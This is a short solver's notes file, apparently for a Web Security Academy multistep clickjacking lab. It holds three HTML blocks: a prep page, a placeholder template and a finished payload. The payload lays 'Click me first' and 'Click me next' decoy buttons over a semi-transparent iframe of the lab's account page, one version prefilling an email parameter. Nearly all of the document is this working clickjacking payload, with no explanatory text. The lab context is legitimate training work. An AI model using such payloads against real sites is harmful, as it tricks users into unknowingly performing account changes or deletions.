
# 1 prep

```html
<style>
 iframe { position:relative; width:500; height: 700; opacity: 0.4; z-index: 2; }
 div { position:absolute; top:10; left:10; opacity: 1; z-index: 1; } 
</style> 
<div>
a<br><br><br>b<br><br><br>c<br><br><br>d<br><br><br>1<br><br><br>2<br><br><br>3<br><br><br>4<br><br><br>
3<br><br><br>
<button id="decoy_button" style="width: 146px; height: 33px; margin-left: 15px; margin-top: -7px;">
    Click me first
</button>
</div> 
<iframe src="https://0a79000004f3452680a2d5da00530015.web-security-academy.net/my-account?email=pwnme@zaddy"></iframe>
```

```html
<style>
 div { position:absolute; top:10; left:10; opacity: 1; z-index: 1; } 
</style> 
<div>
a<br><br><br>b<br><br><br>c<br><br><br>d<br><br><br>1<br><br><br>2<br>
<button id="decoy_button" style="width: 121px; height: 33px; margin-left: 183px; margin-top: -10px;">
    Click me next
</button>
</div> 
```

---

# 2 link

```html
<style> 
 iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; }
 .firstClick, .secondClick { position:absolute; top:$top_value1; left:$side_value1; z-index: 1; }
 .secondClick { top:$top_value2; left:$side_value2; } </style> 
<div class="firstClick">Test me first</div> 
<div class="secondClick">Test me next</div> 
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

---

# payload

```html
<style> 
 iframe { position:relative; width:500; height: 700; opacity: 0.4; z-index: 2; }
 .firstClick, .secondClick { position:absolute; top:10; left:10; opacity:1; z-index: 1; }
 .secondClick { top:10; left:10; } </style> 
  
<div class="firstClick">
a<br><br><br>b<br><br><br>c<br><br><br>d<br><br><br>1<br><br><br>2<br><br><br>3<br><br><br>4<br><br><br>
3<br><br><br>
<button id="decoy_button" style="width: 146px; height: 33px; margin-left: 15px; margin-top: -7px;">
    Click me first
</button>
</div> 

<div class="secondClick">
a<br><br><br>b<br><br><br>c<br><br><br>d<br><br><br>1<br><br><br>2<br>
<button id="decoy_button" style="width: 121px; height: 33px; margin-left: 183px; margin-top: -10px;">
    Click me next
</button>
</div> 

<iframe src="https://0a79000004f3452680a2d5da00530015.web-security-academy.net/my-account"></iframe>
```

---

# end